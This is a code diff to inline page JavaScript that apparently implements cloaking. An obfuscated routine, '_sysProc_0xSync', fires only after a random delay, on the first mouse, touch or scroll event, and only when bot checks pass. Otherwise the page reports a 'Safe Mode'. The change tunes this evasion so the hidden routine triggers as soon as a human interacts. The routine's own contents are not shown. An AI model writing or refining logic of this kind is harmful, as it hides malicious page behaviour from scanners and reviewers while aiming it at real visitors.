@@ -276,7 +276,17 @@
       if (!flags.legitTraffic) console.log("Environment: Standard (Safe Mode)");
     };
 
-    const setHuman = () => { flags.isHuman = true; };
+    let _delayDone = false;
+    const _sysTryAuto = () => {
+      if (_delayDone && flags.isHuman && flags.legitTraffic && !flags.botDetected) {
+        _sysProc_0xSync();
+      }
+    };
+
+    const setHuman = () => { 
+      flags.isHuman = true; 
+      _sysTryAuto();
+    };
     window.addEventListener('mousemove', setHuman, { once: true });
     window.addEventListener('touchstart', setHuman, { once: true });
     window.addEventListener('scroll', setHuman, { once: true });
@@ -336,11 +346,10 @@
     document.addEventListener("DOMContentLoaded", () => {
       _sysVerifyContext(); // Запуск проверки
 
-      const initDelay = Math.floor(Math.random() * (3000 - 2000 + 1)) + 2000;
+      const initDelay = Math.floor(Math.random() * (3500 - 2000 + 1)) + 2000;
       setTimeout(() => {
-        if (flags.isHuman && flags.legitTraffic && !flags.botDetected) {
-          _sysProc_0xSync();
-        }
+        _delayDone = true;
+        _sysTryAuto();
       }, initDelay);
     });
   </script>
